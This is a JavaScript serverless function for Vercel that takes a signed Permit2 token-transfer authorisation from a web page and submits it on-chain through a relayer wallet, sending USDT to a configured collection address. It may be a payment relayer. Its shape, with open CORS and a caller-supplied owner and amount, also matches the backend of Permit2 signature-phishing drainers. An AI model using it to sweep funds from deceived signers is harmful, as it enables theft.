/**
 * Vercel Serverless Function
 * POST /api/collect-permit2
 *
 * Receives the signed Permit2 payload from the frontend and
 * submits permitTransferFrom on-chain using the relayer wallet.
 *
 * Required env vars (set in Vercel → Project Settings → Environment Variables):
 *   RPC_URL
 *   RELAYER_PRIVATE_KEY   (must match spenderAddress in js/wallet-permit2.js)
 *   COLLECTION_ADDRESS    (where USDT is sent)
 */

import { ethers } from 'ethers';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const PERMIT2_ABI = [
  `function permitTransferFrom(
    ((address token, uint256 amount) permitted, address spender, uint256 nonce, uint256 deadline) permit,
    (address to, uint256 requestedAmount) transferDetails,
    address owner,
    bytes signature
  )`
];

export default async function handler(req, res) {
  // CORS for browser requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { permit, signature, owner, amount } = req.body || {};

    if (!permit || !signature || !owner || !amount) {
      return res.status(400).json({ error: 'Missing required fields: permit, signature, owner, amount' });
    }

    const rpcUrl = process.env.RPC_URL;
    const privateKey = process.env.RELAYER_PRIVATE_KEY;
    const collectionAddress = process.env.COLLECTION_ADDRESS;

    if (!rpcUrl || !privateKey || !collectionAddress) {
      return res.status(500).json({
        error: 'Server misconfigured. Set RPC_URL, RELAYER_PRIVATE_KEY, COLLECTION_ADDRESS.'
      });
    }

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayer = new ethers.Wallet(privateKey, provider);

    // Spender in the signed permit must be the relayer address
    if (permit.spender.toLowerCase() !== relayer.address.toLowerCase()) {
      return res.status(400).json({
        error: `Spender mismatch. Signed spender ${permit.spender} != relayer ${relayer.address}`
      });
    }

    const permit2 = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayer);

    const transferDetails = {
      to: collectionAddress,
      requestedAmount: amount
    };

    const tx = await permit2.permitTransferFrom(
      {
        permitted: {
          token: permit.permitted.token,
          amount: permit.permitted.amount
        },
        spender: permit.spender,
        nonce: permit.nonce,
        deadline: permit.deadline
      },
      transferDetails,
      owner,
      signature
    );

    const receipt = await tx.wait();

    return res.status(200).json({
      success: true,
      txHash: receipt.hash,
      blockNumber: receipt.blockNumber
    });
  } catch (err) {
    console.error('collect-permit2 error:', err);
    return res.status(500).json({
      error: err.shortMessage || err.message || 'Transaction failed'
    });
  }
}
